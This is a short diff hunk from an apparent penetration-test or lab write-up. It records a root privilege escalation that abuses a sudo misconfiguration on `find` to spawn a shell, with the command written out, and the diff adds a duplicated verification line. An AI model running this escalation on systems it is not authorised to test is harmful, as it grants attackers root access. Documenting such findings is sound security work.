@@ -5,6 +5,7 @@
 * **Vulnerability:** Sudo misconfiguration on `/usr/bin/find`.
 * **Command:** `sudo find . -exec /bin/sh \; -quit`
 * **Verification:** `whoami` -> `root`
+* **Verification:** `whoami` -> `root` 
 * **Result:** Successfully obtained root-level access.
 
 ## Phase 2: Persistence
